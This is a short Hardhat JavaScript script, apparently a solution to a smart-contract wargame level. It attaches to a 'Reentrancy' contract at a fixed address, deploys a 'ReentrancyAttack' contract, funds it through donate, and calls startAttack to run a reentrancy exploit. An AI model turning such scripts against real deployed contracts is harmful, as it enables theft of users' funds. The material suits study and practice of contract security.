const { ethers } = require("hardhat");

async function main() {
  const instanceAddress = "0x1e4392d737E21E453B3380e17C9dA02BE606dfcc";

  const [attacker] = await ethers.getSigners();
  console.log("Using this address for attack:", attacker.address);

  const Contract = await ethers.getContractFactory("Reentrancy");
  const contract = Contract.attach(instanceAddress);

  const AttackerContract = await ethers.getContractFactory("ReentrancyAttack");
  const attackerContract = await AttackerContract.deploy(
    instanceAddress,
    ethers.utils.parseEther("0.0002")
  );

  // Attack

  await contract.donate(attackerContract.address, {
    value: ethers.utils.parseEther("0.0002"),
  });

  await attackerContract.startAttack();
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
